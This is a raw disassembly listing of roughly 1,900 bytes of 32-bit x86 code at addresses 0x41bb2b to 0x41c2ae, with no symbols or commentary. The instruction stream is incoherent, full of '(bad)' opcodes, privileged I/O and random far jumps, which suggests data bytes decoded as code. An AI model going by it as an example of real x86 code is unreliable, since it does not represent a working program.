  41bb2b:	fnstenv [eax]
  41bb2d:	in     al,0x71
  41bb2f:	inc    BYTE PTR [ebp-0x12031026]
  41bb35:	mov    ds:0x3d1378a,eax
  41bb3a:	mov    al,0x1d
  41bb3c:	inc    ecx
  41bb3d:	jmp    0x344f:0xd0836dbd
  41bb44:	sub    edx,DWORD PTR ds:0x33b11ca
  41bb4a:	mov    bl,BYTE PTR [eax-0x35]
  41bb4d:	or     DWORD PTR [ebp-0x5c6b1647],edi
  41bb53:	ss out 0xe2,al
  41bb56:	inc    edx
  41bb57:	sahf   
  41bb58:	pop    eax
  41bb59:	cwde   
  41bb5a:	int    0x99
  41bb5c:	repnz loope 0x41bb29
  41bb5f:	sbb    BYTE PTR [esi-0x49],dh
  41bb62:	fsubrp st(6),st
  41bb64:	fnstsw WORD PTR [ecx]
  41bb66:	push   esp
  41bb67:	enter  0x9ba0,0x54
  41bb6b:	std    
  41bb6c:	mov    BYTE PTR [ebx+esi*8-0x5],dh
  41bb70:	loopne 0x41bb8b
  41bb72:	and    esi,edi
  41bb74:	idiv   edi
  41bb76:	nop
  41bb77:	stc    
  41bb78:	push   esi
  41bb79:	sahf   
  41bb7a:	inc    eax
  41bb7b:	mov    dl,0xa7
  41bb7d:	xor    eax,ebx
  41bb7f:	test   eax,0x1ebc303a
  41bb84:	mov    eax,ds:0xd1e0b17
  41bb89:	mov    al,0x9f
  41bb8b:	xchg   edx,eax
  41bb8c:	xor    esi,DWORD PTR [edi+0x75a4113a]
  41bb92:	xchg   edi,eax
  41bb93:	and    BYTE PTR [ebp+0x319662be],cl
  41bb99:	in     eax,0xe6
  41bb9b:	mov    ecx,edx
  41bb9d:	gs push ds
  41bb9f:	fsub   DWORD PTR [edi+0x36]
  41bba2:	mov    ah,0x57
  41bba4:	fnstsw WORD PTR [ebx+0x24]
  41bba7:	out    dx,eax
  41bba8:	int    0xd3
  41bbaa:	outs   dx,DWORD PTR ds:[esi]
  41bbab:	or     al,0x71
  41bbad:	ficom  WORD PTR [ecx]
  41bbaf:	test   eax,0xd2635e74
  41bbb4:	popf   
  41bbb5:	ds (bad) 
  41bbb8:	xchg   edx,eax
  41bbb9:	aam    0x86
  41bbbb:	imul   esp,DWORD PTR [edi+eax*1],0xffffffb5
  41bbbf:	mov    al,ds:0x66dfd80
  41bbc4:	dec    esp
  41bbc5:	retf   0x2751
  41bbc8:	aaa    
  41bbc9:	je     0x41bb8e
  41bbcb:	(bad)  [ecx-0x73]
  41bbce:	sar    BYTE PTR [edi+0x1d17a8c6],cl
  41bbd4:	dec    eax
  41bbd5:	test   al,0x67
  41bbd7:	mov    bh,0x7a
  41bbd9:	mov    ecx,DWORD PTR [esi-0x63]
  41bbdc:	out    0xfa,al
  41bbde:	sbb    eax,0x504a2443
  41bbe3:	mov    cs,WORD PTR [edi+0x7a9a7a87]
  41bbe9:	inc    edx
  41bbea:	and    DWORD PTR [ebx-0x77],edx
  41bbed:	mov    bh,0xa9
  41bbef:	inc    ebx
  41bbf0:	es xor eax,0x99e7f56
  41bbf6:	lods   eax,DWORD PTR ds:[esi]
  41bbf7:	xor    DWORD PTR [esi+0x5bdf83aa],edi
  41bbfd:	xchg   ecx,eax
  41bbfe:	add    DWORD PTR [eax],esi
  41bc00:	retf   
  41bc01:	dec    edi
  41bc02:	pop    eax
  41bc03:	mov    edi,0xdd1dde7d
  41bc09:	sub    eax,0xf36b1042
  41bc0e:	rol    ebp,1
  41bc10:	sub    edx,DWORD PTR [esi]
  41bc12:	sub    ebx,eax
  41bc14:	xchg   ebp,eax
  41bc15:	push   es
  41bc16:	cwde   
  41bc17:	mov    eax,0xa14200d5
  41bc1c:	dec    edx
  41bc1d:	jl     0x41bc84
  41bc1f:	sub    al,0x21
  41bc21:	add    DWORD PTR fs:[ebp-0x39336d2],ebp
  41bc28:	loop   0x41bc6e
  41bc2a:	or     eax,0x21aac0df
  41bc2f:	dec    ecx
  41bc30:	mov    ebx,0x94671d3e
  41bc35:	fiadd  WORD PTR [ecx]
  41bc37:	popf   
  41bc38:	cmp    BYTE PTR [ebx+edi*8+0x7d],0xa3
  41bc3d:	rol    BYTE PTR [edi+0x22],cl
  41bc40:	les    eax,FWORD PTR [edx]
  41bc42:	dec    ecx
  41bc43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc44:	adc    eax,edi
  41bc46:	jg     0x41bc5a
  41bc48:	pop    edx
  41bc49:	gs leave 
  41bc4b:	in     al,dx
  41bc4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc4d:	loopne 0x41bc2b
  41bc4f:	imul   eax,DWORD PTR [ecx+0x14f276f8],0xffffff85
  41bc56:	sbb    ebp,ebp
  41bc58:	aad    0x51
  41bc5a:	sar    DWORD PTR [ebx+0x12],1
  41bc5d:	ins    DWORD PTR es:[edi],dx
  41bc5e:	rcr    BYTE PTR [ebx+esi*2],1
  41bc61:	test   eax,0xaa668742
  41bc66:	sti    
  41bc67:	xor    DWORD PTR [edi+0x4a],ebx
  41bc6a:	pop    esi
  41bc6b:	dec    ebp
  41bc6c:	or     al,0xc4
  41bc6e:	leave  
  41bc6f:	mov    dh,0x3d
  41bc71:	or     edi,DWORD PTR [ebp+0xef443ae]
  41bc77:	mov    edx,0x277fc375
  41bc7c:	mov    cl,0x3d
  41bc7e:	inc    esp
  41bc7f:	mov    edi,edx
  41bc81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc82:	xchg   dh,dh
  41bc84:	xchg   ebx,eax
  41bc85:	data16 add BYTE PTR [ebp-0x11c951c1],ah
  41bc8c:	lods   al,BYTE PTR ds:[esi]
  41bc8d:	lds    ecx,FWORD PTR [edx]
  41bc8f:	aas    
  41bc90:	enter  0x8d4,0x82
  41bc94:	xor    al,0x56
  41bc96:	ss mov edx,0x26e008f
  41bc9c:	aas    
  41bc9d:	es daa 
  41bc9f:	push   es
  41bca0:	pop    es
  41bca1:	loopne 0x41bc72
  41bca3:	xor    eax,0xc4dc893
  41bca8:	inc    eax
  41bca9:	lock mov esi,DWORD PTR [esi-0x4aa561b6]
  41bcb0:	retf   0x44f7
  41bcb3:	cdq    
  41bcb4:	mov    ch,0xe4
  41bcb6:	ja     0x41bc7a
  41bcb8:	call   0x96d7:0x5b3fa339
  41bcbf:	add    eax,0xe0a04e40
  41bcc4:	repz inc esi
  41bcc6:	inc    edx
  41bcc7:	dec    esp
  41bcc8:	fadd   st,st(3)
  41bcca:	aas    
  41bccb:	xchg   esi,eax
  41bccc:	jg     0x41bc64
  41bcce:	ins    DWORD PTR es:[edi],dx
  41bccf:	and    ch,BYTE PTR [eax-0x6c4313ae]
  41bcd5:	outs   dx,DWORD PTR ss:[esi]
  41bcd7:	fld    TBYTE PTR [edx+ecx*1-0x6]
  41bcdb:	add    BYTE PTR [edi],0x52
  41bcde:	cmc    
  41bcdf:	pop    es
  41bce0:	fwait
  41bce1:	mov    fs,WORD PTR [edi-0x3515d980]
  41bce7:	loopne 0x41bd27
  41bce9:	test   BYTE PTR [ebx+0x11932edc],0xd3
  41bcf0:	add    eax,0x55ffd245
  41bcf5:	sub    esp,ebx
  41bcf7:	nop
  41bcf8:	mov    cl,0x49
  41bcfa:	test   BYTE PTR [esi+0x6e],ah
  41bcfd:	inc    edx
  41bcfe:	sbb    esi,ebp
  41bd00:	add    BYTE PTR [ebp-0xd],bh
  41bd03:	test   BYTE PTR [edi-0x6f],dl
  41bd06:	sub    al,BYTE PTR [edi-0x31]
  41bd09:	jmp    0xdfcdaf65
  41bd0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd0f:	scas   al,BYTE PTR es:[edi]
  41bd10:	ffree  st(2)
  41bd12:	out    dx,eax
  41bd13:	mov    dl,0xc6
  41bd15:	adc    DWORD PTR [edi+0x7c79ab19],ebp
  41bd1b:	not    BYTE PTR [ecx]
  41bd1d:	xlat   BYTE PTR ds:[ebx]
  41bd1e:	jns    0x41bca3
  41bd20:	or     dh,dl
  41bd22:	inc    edi
  41bd23:	pop    es
  41bd24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd25:	xor    edi,DWORD PTR [esi-0x71]
  41bd28:	add    edx,DWORD PTR [ecx+eiz*1]
  41bd2b:	stc    
  41bd2c:	mov    bl,0xa3
  41bd2e:	ins    DWORD PTR es:[edi],dx
  41bd2f:	sub    edx,edx
  41bd31:	pop    eax
  41bd32:	enter  0xf19b,0xac
  41bd36:	inc    esi
  41bd37:	test   al,0x2c
  41bd39:	dec    edi
  41bd3a:	pop    edx
  41bd3b:	mov    dh,0xb4
  41bd3d:	lods   al,BYTE PTR ds:[esi]
  41bd3e:	gs ins DWORD PTR es:[edi],dx
  41bd40:	mov    edi,0x8557c89f
  41bd45:	sbb    al,BYTE PTR ds:0xb41e32a2
  41bd4b:	adc    eax,0xa3a71409
  41bd50:	std    
  41bd51:	pop    eax
  41bd52:	mov    cs,WORD PTR [esi+0x4a]
  41bd55:	pop    ebx
  41bd56:	mov    ecx,DWORD PTR [ebx]
  41bd58:	out    0x91,eax
  41bd5a:	add    esp,DWORD PTR [edi+0x3b]
  41bd5d:	pop    es
  41bd5e:	ror    BYTE PTR [ebx],cl
  41bd60:	cmp    BYTE PTR [esp+ecx*2],dh
  41bd63:	dec    esp
  41bd64:	cmp    BYTE PTR [eax-0x52],0x6c
  41bd68:	int    0x1c
  41bd6a:	mov    ss,WORD PTR [edi]
  41bd6c:	mov    bl,0xab
  41bd6e:	inc    edx
  41bd6f:	xchg   esi,eax
  41bd70:	xchg   ebx,eax
  41bd71:	xchg   esp,eax
  41bd72:	add    eax,0xc8650286
  41bd77:	and    esi,DWORD PTR ds:0x3f1bb371
  41bd7d:	xor    DWORD PTR [eax],eax
  41bd7f:	fwait
  41bd80:	aad    0xfe
  41bd82:	test   al,0x33
  41bd84:	out    0xc7,eax
  41bd86:	sub    DWORD PTR [edx-0x22],0xbd0abba3
  41bd8d:	xchg   edi,ecx
  41bd8f:	push   ds
  41bd90:	mov    dl,0x3d
  41bd92:	fs (bad) 
  41bd94:	repz and eax,0x4cc794c3
  41bd9a:	sub    esp,DWORD PTR [ebx+0x66]
  41bd9d:	lock retf 0x3e0d
  41bda1:	xor    BYTE PTR [eax+0x34],dl
  41bda4:	fisub  DWORD PTR [ecx+0x19e1133a]
  41bdaa:	sbb    BYTE PTR [edx],dl
  41bdac:	test   edi,ebp
  41bdae:	lods   eax,DWORD PTR ds:[esi]
  41bdaf:	pop    edi
  41bdb0:	sbb    eax,0x9404d3e9
  41bdb5:	jnp    0x41be0d
  41bdb7:	les    edx,FWORD PTR [edi+0x5a6d6096]
  41bdbd:	adc    BYTE PTR [edi+0x31],0x6
  41bdc1:	ins    BYTE PTR es:[edi],dx
  41bdc2:	sub    ebp,ebp
  41bdc4:	add    dh,BYTE PTR [ebx+esi*4]
  41bdc7:	lea    ebx,[ecx+0x51cc951f]
  41bdcd:	mov    ch,0xf4
  41bdcf:	mov    ecx,0xd5abe18f
  41bdd4:	pop    ecx
  41bdd5:	pop    ebx
  41bdd6:	jne    0x41bda8
  41bdd8:	out    0x55,eax
  41bdda:	sar    esi,1
  41bddc:	aas    
  41bddd:	loope  0x41be52
  41bddf:	je     0x41be19
  41bde1:	jp     0x41bd8c
  41bde3:	mov    ds:0x69201dcf,al
  41bde8:	mov    edx,0xa604b462
  41bded:	and    edx,DWORD PTR ds:0x2166160f
  41bdf3:	lods   eax,DWORD PTR ds:[esi]
  41bdf4:	frstor [edi+0x39]
  41bdf7:	inc    ecx
  41bdf8:	loop   0x41be74
  41bdfa:	popa   
  41bdfb:	retf   
  41bdfc:	jg     0x41be22
  41bdfe:	punpckhdq mm4,QWORD PTR [esi-0x3b]
  41be02:	jns    0x41be61
  41be04:	pop    esi
  41be05:	(bad)  
  41be06:	adc    cl,BYTE PTR ds:0x118d1c17
  41be0c:	or     al,0x43
  41be0e:	jne    0x41bdc7
  41be10:	test   al,0x34
  41be12:	lahf   
  41be13:	scas   eax,DWORD PTR es:[edi]
  41be14:	out    dx,eax
  41be15:	ret    0x390d
  41be18:	push   ds
  41be19:	pop    ecx
  41be1a:	cmovae edi,DWORD PTR [ebx-0x40]
  41be1e:	into   
  41be1f:	or     dl,al
  41be21:	xchg   si,ax
  41be23:	(bad)  
  41be24:	int3   
  41be25:	xlat   BYTE PTR ds:[ebx]
  41be26:	jp     0x41be3b
  41be28:	call   FWORD PTR [ebp-0x77]
  41be2b:	mov    bh,0x69
  41be2d:	add    eax,0xdfe21cbe
  41be32:	sub    dh,BYTE PTR [edi-0x341903a7]
  41be38:	adc    eax,0xc7ee9315
  41be3d:	inc    eax
  41be3e:	scas   al,BYTE PTR es:[edi]
  41be3f:	pop    es
  41be40:	fld    TBYTE PTR [eax]
  41be42:	xor    BYTE PTR [ecx-0x387cb003],al
  41be48:	cmc    
  41be49:	loop   0x41be24
  41be4b:	repz popa 
  41be4d:	iret   
  41be4e:	push   0x1ce7d758
  41be53:	sub    bh,BYTE PTR [ecx]
  41be55:	test   BYTE PTR [esi+0x39],ah
  41be58:	addr16 sbb eax,0xa198879
  41be5e:	in     al,dx
  41be5f:	inc    eax
  41be60:	lods   eax,DWORD PTR ds:[esi]
  41be61:	addr16 dec esp
  41be63:	mov    esp,0xb9e8e98f
  41be68:	mov    edx,0x55342c70
  41be6d:	das    
  41be6e:	mov    ecx,0x6fd2c57e
  41be73:	out    dx,al
  41be74:	test   al,0x33
  41be76:	ret    
  41be77:	test   DWORD PTR [ebx-0x3c],0xc81c1307
  41be7e:	int3   
  41be7f:	mov    cl,BYTE PTR [esi]
  41be81:	neg    BYTE PTR [edx+0x2a]
  41be84:	pop    ebp
  41be85:	mov    cl,0x96
  41be87:	loope  0x41be6f
  41be89:	ds push ds
  41be8b:	(bad)  [ecx+0x5f]
  41be8e:	push   cs
  41be8f:	rol    DWORD PTR [ecx-0x5c1132d0],cl
  41be95:	cmp    eax,DWORD PTR [ebx+0x1c]
  41be98:	or     esp,DWORD PTR [edx-0x64a1b722]
  41be9e:	pop    ecx
  41be9f:	inc    ebx
  41bea0:	and    ah,BYTE PTR [esi]
  41bea2:	jge    0x41be74
  41bea4:	dec    ebp
  41bea5:	and    BYTE PTR [eax-0x27961905],bh
  41beab:	shr    al,0x80
  41beae:	mov    ebx,0xfdb9942a
  41beb3:	leave  
  41beb4:	or     al,0x55
  41beb6:	cmp    ch,al
  41beb8:	leave  
  41beb9:	test   BYTE PTR [edi+ebx*8+0x31e5e749],al
  41bec0:	sub    ah,dh
  41bec2:	xchg   edi,eax
  41bec3:	es push edi
  41bec5:	mov    ch,bh
  41bec7:	sub    BYTE PTR [ebx-0x71],0xda
  41becb:	mov    ebp,0xd1990b5b
  41bed0:	cmp    eax,0xab21d9d6
  41bed5:	and    al,0x76
  41bed7:	or     eax,eax
  41bed9:	hlt    
  41beda:	xor    al,0xc7
  41bedc:	pop    ebp
  41bedd:	cmp    ah,ch
  41bedf:	ss retf 0xdd6
  41bee3:	mov    dl,BYTE PTR [ebp+0x55]
  41bee6:	aad    0x1f
  41bee8:	clc    
  41bee9:	fwait
  41beea:	add    ebp,0xffffffb7
  41beed:	xlat   BYTE PTR ds:[ebx]
  41beee:	in     eax,dx
  41beef:	jbe    0x41bec5
  41bef1:	jecxz  0x41bee1
  41bef3:	test   DWORD PTR ds:0x3f0261d8,0x1e4209f1
  41befd:	mov    bh,BYTE PTR [ecx+ebx*2+0x1be175e3]
  41bf04:	cmp    ah,BYTE PTR [edi-0x41]
  41bf07:	mov    bh,0x3a
  41bf09:	xlat   BYTE PTR ds:[ebx]
  41bf0a:	or     BYTE PTR [eax],0xc1
  41bf0d:	sti    
  41bf0e:	leave  
  41bf0f:	mov    al,0x5d
  41bf11:	dec    ebx
  41bf12:	ss out dx,eax
  41bf14:	sub    al,0x1d
  41bf16:	mov    gs,edi
  41bf18:	rol    BYTE PTR [ebp+0x2c],0x71
  41bf1c:	push   ss
  41bf1d:	popa   
  41bf1e:	test   BYTE PTR [esi+0x7e],cl
  41bf21:	mov    ebx,0x45592187
  41bf26:	jmp    0x41bf1c
  41bf28:	sbb    DWORD PTR [ebp+ecx*4+0x30],ebx
  41bf2c:	jnp    0x41beda
  41bf2e:	in     eax,dx
  41bf2f:	iret   
  41bf30:	mov    esi,0x690777bd
  41bf35:	xchg   esi,eax
  41bf36:	or     al,0xc3
  41bf38:	data16 add al,0x7d
  41bf3b:	add    DWORD PTR [ecx-0x59e22767],esp
  41bf41:	xor    eax,0xff4ba787
  41bf46:	icebp  
  41bf47:	into   
  41bf48:	push   ds
  41bf49:	xor    bh,ah
  41bf4b:	xor    bl,BYTE PTR [ebp+0x2c]
  41bf4e:	je     0x41bf62
  41bf50:	sbb    bl,ch
  41bf52:	mov    edx,DWORD PTR [esi]
  41bf54:	in     eax,0xd5
  41bf56:	dec    edx
  41bf57:	in     eax,0x9c
  41bf59:	add    al,0xcc
  41bf5b:	push   esp
  41bf5c:	pop    ds
  41bf5d:	cmp    BYTE PTR [eax*4+0x700c7da9],ch
  41bf64:	imul   ecx,DWORD PTR [edi*8-0x7556bca5],0xc6100131
  41bf6f:	cld    
  41bf70:	sbb    DWORD PTR [esi-0x79],0x6c
  41bf74:	or     al,BYTE PTR [edi]
  41bf76:	push   es
  41bf77:	add    edi,DWORD PTR [eax]
  41bf79:	xchg   ch,cl
  41bf7b:	xor    al,0x8b
  41bf7d:	jmp    0x41bfc0
  41bf7f:	pop    edi
  41bf80:	and    eax,0x59a465ac
  41bf85:	adc    BYTE PTR ds:[ecx+esi*8+0x5fe530aa],ch
  41bf8d:	and    cl,BYTE PTR [ebx-0x5a]
  41bf90:	add    DWORD PTR [eax+0x6ef4217d],edx
  41bf96:	mov    ds:0x27efe1bc,eax
  41bf9b:	lock popf 
  41bf9d:	gs mov cl,0x88
  41bfa0:	int    0x35
  41bfa2:	ss in  eax,dx
  41bfa4:	inc    edi
  41bfa5:	test   dh,dh
  41bfa7:	inc    ebp
  41bfa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfa9:	add    eax,0xe3c62478
  41bfae:	adc    ah,cl
  41bfb0:	repnz daa 
  41bfb2:	lds    edi,FWORD PTR [eax]
  41bfb4:	inc    ebp
  41bfb5:	fs rol ebx,cl
  41bfb8:	outs   dx,BYTE PTR ds:[esi]
  41bfb9:	jge    0x41bf85
  41bfbb:	clts   
  41bfbd:	push   esp
  41bfbe:	int3   
  41bfbf:	test   eax,0xffd99fcb
  41bfc4:	mov    ds:0x7aa16461,al
  41bfc9:	(bad)  
  41bfca:	mov    cs,WORD PTR [ecx]
  41bfcc:	jo     0x41bfda
  41bfce:	mov    al,ds:0xa3b0686b
  41bfd3:	mov    dl,0x5d
  41bfd5:	ds dec edi
  41bfd7:	mov    bh,0x77
  41bfd9:	and    bl,BYTE PTR [esi]
  41bfdb:	std    
  41bfdc:	pop    es
  41bfdd:	push   cs
  41bfde:	loop   0x41c05b
  41bfe0:	addr16 into 
  41bfe2:	mov    ah,0x9b
  41bfe4:	cmp    eax,DWORD PTR [ebp+0x156591b]
  41bfea:	jo     0x41bfa6
  41bfec:	test   eax,0x8d6f030e
  41bff1:	sub    DWORD PTR [ebx],esp
  41bff3:	push   es
  41bff4:	add    ah,BYTE PTR [edx+0x3b]
  41bff7:	les    ecx,FWORD PTR [edx-0x2b7ac606]
  41bffd:	mov    ch,0xde
  41bfff:	mov    edx,ebx
  41c001:	dec    esi
  41c002:	addr16 jb 0x41c028
  41c005:	dec    edx
  41c006:	pop    edx
  41c007:	data16 fsubr st(7),st
  41c00a:	or     ch,al
  41c00c:	scas   eax,DWORD PTR es:[edi]
  41c00d:	sub    DWORD PTR [eax-0x606e4967],edx
  41c013:	lods   eax,DWORD PTR ds:[esi]
  41c014:	lahf   
  41c015:	out    0x32,al
  41c017:	adc    BYTE PTR [edx+0x4b3125],cl
  41c01d:	lods   eax,DWORD PTR ds:[esi]
  41c01e:	les    edx,FWORD PTR [ebx+0x1d]
  41c021:	mov    eax,0x5ca22441
  41c026:	ficom  DWORD PTR [eax-0x6e4d5f25]
  41c02c:	pop    esp
  41c02d:	push   cs
  41c02e:	arpl   bx,bp
  41c030:	dec    edx
  41c031:	push   edi
  41c032:	adc    DWORD PTR [edi-0x4b11397b],edx
  41c038:	jmp    0x41c052
  41c03a:	gs or  eax,0x18ec70d
  41c040:	ror    BYTE PTR [ecx],0x2a
  41c043:	push   edx
  41c044:	sar    cl,1
  41c046:	pop    ebp
  41c047:	out    0x26,al
  41c049:	(bad)  
  41c04a:	shl    BYTE PTR [edi+0x4b],cl
  41c04d:	dec    eax
  41c04e:	mov    cl,0xe
  41c050:	out    0xfa,al
  41c052:	fxch   st(1)
  41c054:	add    al,0xbc
  41c056:	jnp    0x41c02a
  41c058:	mov    eax,gs:0x774092fc
  41c05e:	inc    esp
  41c05f:	enter  0xf55b,0x35
  41c063:	xchg   ecx,eax
  41c064:	inc    esp
  41c065:	sbb    eax,0x87a6558a
  41c06a:	(bad)  
  41c06b:	jp     0x41c08f
  41c06d:	shl    BYTE PTR [ebx],cl
  41c06f:	push   esi
  41c070:	mov    bl,0x5a
  41c072:	mov    bl,0x77
  41c074:	mov    edx,0xf576481d
  41c079:	pushf  
  41c07a:	xor    DWORD PTR [esp+esi*8+0x40],ebx
  41c07e:	add    edx,edx
  41c080:	cdq    
  41c081:	push   0x24db3cbb
  41c086:	outs   dx,DWORD PTR ds:[esi]
  41c087:	push   ebx
  41c088:	or     al,0xa2
  41c08a:	cwde   
  41c08b:	stc    
  41c08c:	les    ebp,FWORD PTR [esi-0x28]
  41c08f:	xor    BYTE PTR [eax-0x3e],ah
  41c092:	repz (bad) 
  41c094:	pop    esi
  41c095:	into   
  41c096:	mov    dl,dl
  41c098:	bound  ebp,QWORD PTR [eax+0x30]
  41c09b:	stc    
  41c09c:	mov    eax,ds:0xea59f6db
  41c0a1:	das    
  41c0a2:	xchg   edx,eax
  41c0a3:	and    ebx,esp
  41c0a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0a6:	or     eax,0x667caa93
  41c0ab:	call   0x53e9:0xe958bd82
  41c0b2:	(bad)  [edx]
  41c0b4:	pop    edi
  41c0b5:	into   
  41c0b6:	test   BYTE PTR [esp+esi*4+0xb],dh
  41c0ba:	push   0x35d4426d
  41c0bf:	stos   BYTE PTR es:[edi],al
  41c0c0:	call   0x9c63:0xc803083c
  41c0c7:	out    0xa4,al
  41c0c9:	sbb    BYTE PTR [ecx+0x78],al
  41c0cc:	in     eax,0x96
  41c0ce:	inc    edx
  41c0cf:	sbb    DWORD PTR [eax+0x7a2576df],edi
  41c0d5:	out    dx,eax
  41c0d6:	jo     0x41c151
  41c0d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0d9:	ficomp DWORD PTR [ebp+0xcf49a9e]
  41c0df:	add    eax,0xdce65547
  41c0e4:	xchg   esi,eax
  41c0e5:	sbb    DWORD PTR [esi],edx
  41c0e7:	ret    
  41c0e8:	adc    dl,BYTE PTR [edx-0x47d9fa14]
  41c0ee:	js     0x41c075
  41c0f0:	push   es
  41c0f1:	les    ebp,FWORD PTR [edi]
  41c0f3:	mov    esp,0xdc31430c
  41c0f8:	rcr    DWORD PTR [ebp-0x59],1
  41c0fb:	bound  eax,QWORD PTR [ebx+0xeae65ff]
  41c101:	cmp    DWORD PTR [esi],ebp
  41c103:	mov    dl,0xea
  41c105:	stc    
  41c106:	dec    esi
  41c107:	inc    ecx
  41c108:	pusha  
  41c109:	and    eax,0x1146cd7
  41c10e:	nop
  41c10f:	jge    0x41c175
  41c111:	or     eax,0xe1e7a8be
  41c116:	pushf  
  41c117:	ins    DWORD PTR es:[edi],dx
  41c118:	and    eax,esp
  41c11a:	or     al,0x98
  41c11c:	test   esi,esi
  41c11e:	aas    
  41c11f:	sar    DWORD PTR [ebx+ebx*4+0x42],0xa0
  41c124:	arpl   WORD PTR [eax-0x25],si
  41c127:	es push ss
  41c129:	test   eax,0xed7ec090
  41c12e:	mov    bl,0x1e
  41c130:	mov    fs,WORD PTR [ebp+0x15a193fe]
  41c136:	popf   
  41c137:	popa   
  41c138:	inc    esi
  41c139:	xchg   ebp,eax
  41c13a:	jno    0x41c157
  41c13c:	les    eax,FWORD PTR [esi+0x5]
  41c13f:	mov    ?,ebx
  41c141:	and    eax,0x60e007cd
  41c146:	pop    ds
  41c147:	shr    BYTE PTR [esi-0x1c],0xf8
  41c14b:	sahf   
  41c14c:	lds    edi,FWORD PTR [eax+eax*4]
  41c14f:	idiv   BYTE PTR [esp+esi*4]
  41c152:	pop    esp
  41c153:	inc    ebp
  41c154:	xor    eax,0x13c52c6d
  41c159:	pop    ds
  41c15a:	imul   ecx,eax,0xffffff9f
  41c15d:	adc    ebx,ebp
  41c15f:	cmp    dl,BYTE PTR [edi+0x7]
  41c162:	mov    dl,0xdf
  41c164:	repnz test BYTE PTR [ebp-0x69],ah
  41c168:	sbb    al,BYTE PTR [ebx-0x4a]
  41c16b:	lods   al,BYTE PTR ds:[esi]
  41c16c:	adc    eax,0x85a38e07
  41c171:	repnz and eax,0x71d5460c
  41c177:	mov    ah,0x1b
  41c179:	or     bh,al
  41c17b:	inc    ebp
  41c17c:	fld    TBYTE PTR [ecx+ecx*1]
  41c17f:	dec    ebp
  41c180:	lock rcl BYTE PTR fs:[eax+0x11a19cc5],0x6a
  41c189:	in     al,0xb2
  41c18b:	and    eax,0x88ce8ac6
  41c190:	add    edx,edi
  41c192:	aad    0x5b
  41c194:	mov    eax,ds:0x2b687044
  41c199:	mov    ebp,0x2c7d8dc8
  41c19e:	cli    
  41c19f:	push   cs
  41c1a0:	xor    DWORD PTR ds:0x71087d76,ecx
  41c1a6:	std    
  41c1a7:	add    esi,DWORD PTR [ebx+0x2b]
  41c1aa:	and    al,0xf6
  41c1ac:	cmp    eax,0x2c3af67b
  41c1b1:	test   BYTE PTR [eax+0x46924d6b],al
  41c1b7:	test   eax,0xec7e66e6
  41c1bc:	mov    ch,0xd5
  41c1be:	cmp    esi,DWORD PTR [eax+0x55]
  41c1c1:	xor    eax,DWORD PTR [edx]
  41c1c3:	jg     0x41c176
  41c1c5:	push   esp
  41c1c6:	inc    DWORD PTR [edx-0x146497fd]
  41c1cc:	fstp   TBYTE PTR [ebp+0x52]
  41c1cf:	adc    eax,0xda7ba9da
  41c1d4:	push   ebx
  41c1d5:	jns    0x41c1f6
  41c1d7:	and    al,0x97
  41c1d9:	jmp    0x41c1f7
  41c1db:	sub    DWORD PTR [edx],0x1786ca68
  41c1e1:	and    al,dl
  41c1e3:	or     eax,0xb6262a5e
  41c1e8:	mov    ah,0x4f
  41c1ea:	adc    ebx,DWORD PTR [eax+0x4d50cc95]
  41c1f0:	push   esp
  41c1f1:	imul   ecx,DWORD PTR [ebx],0x3a7fb8b3
  41c1f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1f8:	fst    QWORD PTR [eax-0xca92e47]
  41c1fe:	mov    ds:0x5a6a4cfc,eax
  41c203:	das    
  41c204:	stos   DWORD PTR es:[edi],eax
  41c205:	push   0x5d
  41c207:	xchg   ebp,eax
  41c208:	mov    fs,WORD PTR es:[edi+0x1c]
  41c20c:	xor    al,0xef
  41c20e:	fcom   QWORD PTR [edi]
  41c210:	xlat   BYTE PTR ds:[ebx]
  41c211:	sub    DWORD PTR [ecx+0x3e],ebx
  41c214:	or     ebp,esi
  41c216:	dec    edx
  41c217:	cmp    edx,DWORD PTR [ebp+esi*4+0x5501a7f0]
  41c21e:	mov    dl,0xaa
  41c220:	jmp    0x41c263
  41c222:	jnp    0x41c20f
  41c224:	xchg   BYTE PTR [esi-0xf],al
  41c227:	and    DWORD PTR [edx+0xc41d514],0x2d
  41c22e:	mov    ?,WORD PTR [ebp+edi*8-0x1328f4c9]
  41c235:	sbb    DWORD PTR [esi-0x35],ecx
  41c238:	jecxz  0x41c1eb
  41c23a:	or     edi,DWORD PTR ds:0xf469f3bc
  41c240:	push   cs
  41c241:	clc    
  41c242:	(bad)  
  41c243:	sbb    al,0xb5
  41c245:	pop    esp
  41c246:	nop
  41c247:	mov    al,ds:0x15a9ff2b
  41c24c:	ja     0x41c2cd
  41c24e:	xor    DWORD PTR [esi],0x9e0c5698
  41c254:	loop   0x41c29f
  41c256:	jle    0x41c25b
  41c258:	les    eax,FWORD PTR [ebp-0x35]
  41c25b:	xor    BYTE PTR [edx],0x9
  41c25e:	push   esi
  41c25f:	push   esi
  41c260:	mov    ebp,DWORD PTR [ebx-0x3312cddb]
  41c266:	push   ds
  41c267:	jmp    0x9e79:0xc94a8443
  41c26e:	loope  0x41c2aa
  41c270:	outs   dx,DWORD PTR ds:[esi]
  41c271:	sar    BYTE PTR [edx],1
  41c273:	call   0xc5b1:0x88a1a26b
  41c27a:	es stos BYTE PTR es:[edi],al
  41c27c:	mov    ebx,0xb303957a
  41c281:	out    0xc8,eax
  41c283:	outs   dx,BYTE PTR ds:[esi]
  41c284:	pop    esp
  41c285:	cld    
  41c286:	fdiv   DWORD PTR [edi+0x60]
  41c289:	pop    ebp
  41c28a:	pusha  
  41c28b:	mov    eax,0x47eee64f
  41c290:	jg     0x41c2b4
  41c292:	push   edx
  41c293:	popf   
  41c294:	(bad)  
  41c295:	jmp    0xa473ec40
  41c29a:	ficomp WORD PTR ds:0xbb97b389
  41c2a0:	jne    0x41c321
  41c2a2:	inc    esi
  41c2a3:	push   0xfffffffe
  41c2a5:	pop    es
  41c2a6:	data16 scas al,BYTE PTR es:[edi]
  41c2a8:	test   eax,0x7cfa159
  41c2ad:	push   edx
  41c2ae:	outs   dx,BYTE PTR ds:[esi]
